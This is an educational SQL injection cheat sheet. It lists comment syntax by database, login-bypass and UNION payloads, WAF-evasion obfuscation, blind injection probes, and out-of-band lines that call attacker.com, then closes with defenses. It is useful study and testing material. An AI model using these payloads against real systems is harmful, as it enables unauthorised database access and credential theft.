
# SQL Injection Cheat Sheet

This guide provides a comprehensive overview of SQL Injection (SQLi), including common comment syntax, payload examples, evasion techniques, and classification of SQLi types.

For an in-depth reference, see: [PortSwigger SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

---

## 1. Database-Specific Comment Syntax

| Database       | Single-Line Comments                                   | Block Comments  | Notes                                                                 |
|----------------|--------------------------------------------------------|-----------------|-----------------------------------------------------------------------|
| Oracle         | `--comment`                                            | `/*comment*/`   | Requires `FROM DUAL` for standalone `SELECT` statements.              |
| Microsoft SQL  | `--comment`                                            | `/*comment*/`   | Does not require a space after `--`. Supports stacked queries.        |
| PostgreSQL     | `--comment`                                            | `/*comment*/`   | Similar to Microsoft SQL. Supports stacked queries.                   |
| MySQL          | `#comment` <br> `-- comment` <br> `--+` <br> `-- -`    | `/*comment*/`   | `--` must be followed by a space. `#` is a valid standalone comment.  |

---

## 2. Comment Behavior and Bypass Techniques

### Oracle

All `SELECT` statements require a `FROM` clause. Use the dummy table `DUAL`:

```sql
' UNION SELECT NULL FROM DUAL--
````

### MySQL

Valid comment styles:

```sql
--      → Invalid (missing space)
--+     → Valid (URL-encoded space)
-- -    → Valid (space added)
#       → Valid
```

### Comment Obfuscation for WAF Bypass

```sql
/*! MySQL-specific comment syntax */
/*!32302 1=0 */                         -- Executes only if server version ≥ 3.23.2
SELECT/*bypass*/user                   -- Obfuscate keywords
UNI/**/ON SEL/**/ECT * FROM users      -- Break keywords into parts
```

---

## 3. SQL Injection Payload Examples

| Scenario              | Oracle Example                           | MySQL Example                |
| --------------------- | ---------------------------------------- | ---------------------------- |
| Union-based injection | `' UNION SELECT username FROM DUAL--`    | `' UNION SELECT username#`   |
| Login bypass          | `admin'--`                               | `admin'-- -`                 |
| Conditional logic     | `' OR 'a'='a'--`                         | `' OR 1=1--+`                |
| WAF evasion           | `' UNI/*foo*/ON SELECT NULL FROM DUAL--` | `' UNI/*!ON*/ SELECT 1,2,3#` |
| Version detection     | N/A                                      | `' /*!32302 AND*/ 1=0-- -`   |

---

## 4. Types of SQL Injection

SQL Injection can be classified into three primary types: **In-band**, **Inferential (Blind)**, and **Out-of-band**. Each varies in complexity and observability.

### 4.1 In-Band SQLi

The attacker uses the same communication channel to both deliver the payload and receive the result. It is the most straightforward type.

#### Error-Based SQLi

Leverages verbose error messages to retrieve schema or data information.

```sql
' AND 1=CONVERT(int, (SELECT @@version))--
```

#### Union-Based SQLi

Uses the `UNION` operator to combine results from different queries into a single response.

```sql
' UNION SELECT username, password FROM users--
```

---

### 4.2 Inferential (Blind) SQLi

The attacker does not directly receive query results, but infers information based on application behavior.

#### Boolean-Based Blind SQLi

Uses true/false statements to determine logical outcomes based on server responses.

```sql
' AND 1=1--        -- Page loads normally
' AND 1=2--        -- Page behaves differently
```

#### Time-Based Blind SQLi

Uses time delays to measure conditional execution.

```sql
' OR IF(1=1, SLEEP(5), 0)--     -- Server delays response
' OR IF(1=2, SLEEP(5), 0)--     -- No delay
```

---

### 4.3 Out-of-Band SQLi

Used when the attacker cannot use the same channel to receive output. Depends on features like DNS or HTTP calls from the database server.

#### Common Techniques

* **Microsoft SQL Server**

  ```sql
  EXEC master..xp_dirtree '\\attacker.com\payload'
  ```

* **Oracle Database**

  ```sql
  SELECT UTL_HTTP.request('http://attacker.com') FROM dual;
  ```

Out-of-band methods are useful when time-based and boolean-based inference is unreliable due to unstable response behavior.

---

## 5. Defense Strategies

To mitigate SQL injection risks:

1. **Use Parameterized Queries (Prepared Statements)**
   Avoid string concatenation to build SQL queries.

2. **Apply Server-Side Input Validation**
   Validate and sanitize input against a whitelist of acceptable values.

3. **Implement Least Privilege Access**
   Ensure database accounts have only the permissions necessary for their function.

4. **Disable Detailed Error Messages in Production**
   Return generic messages to users and log detailed errors securely.

5. **Use Web Application Firewalls (WAFs)**
   Combine behavioral and signature-based detection for added protection.

---

## References

* [PortSwigger SQL Injection Guide](https://portswigger.net/web-security/sql-injection)
* [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
* [Acunetix SQLi Scanner](https://www.acunetix.com/vulnerabilities/web/sql-injection/)

